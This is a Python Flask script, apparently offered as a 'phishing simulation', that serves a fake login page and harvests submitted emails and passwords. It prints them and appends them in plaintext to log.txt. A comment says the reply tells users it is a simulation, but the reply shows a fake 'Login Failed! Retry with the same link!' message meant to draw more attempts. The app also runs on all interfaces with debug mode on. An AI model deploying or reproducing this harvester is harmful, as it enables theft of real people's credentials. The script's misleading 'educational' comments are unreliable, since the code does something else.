from flask import Flask, render_template, request

app = Flask(__name__)

# Route for the phishing simulation page
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Capture the form data (email and password)
        username = request.form.get('email')
        password = request.form.get('password')

        # Log the data in the console (for educational purposes only)
        print(f"Simulated Login Attempt:\n  Email: {username}\n  Password: {password}")

        # Save the data to a file
        with open('log.txt', 'a') as file:
            file.write(f"Email: {username}, Password: {password}\n")

        # Return a message to inform users this is a simulation
        return """
        <h3 style="color: red; text-align: center;">Login Failed!</h3>
        <p style="text-align: center;">Retry with the same link!</p>
        """

    # Render the phishing HTML template
    return render_template('phishing.html')


if __name__ == '__main__':
    # Run the Flask app on all interfaces (host=0.0.0.0) and port 5000
    app.run(debug=True, host='0.0.0.0', port=5000)
